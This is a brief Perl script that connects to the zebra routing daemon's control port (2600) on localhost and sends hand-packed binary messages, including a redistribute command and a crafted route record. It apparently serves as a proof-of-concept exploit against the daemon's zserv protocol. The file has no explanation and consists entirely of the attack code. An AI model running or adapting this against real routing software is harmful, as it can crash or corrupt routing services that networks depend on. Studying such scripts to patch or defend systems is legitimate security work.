#!/usr/bin/perl

use IO::Socket;

$command = 11; # 11 = redistribute_add , 13 = redistribute_default_add

$proto = 2; # connected 

$remote = IO::Socket::INET->new (Proto => "tcp",
                                 PeerAddr => "127.0.0.1",
                                 PeerPort => "2600",
                                 );
$remote->autoflush (1);
#print $remote pack ("nc", 3, 13);
print $remote pack ("nc",3,1);
print $remote pack ("ncc", 4,$command,2);
print $remote pack ("ncccccNcNcNN", 25, 7, 10, 16, 11, 25, 0xc0a80206, 0, 0, 1, 5, 1);
print <$remote>;
close $remote
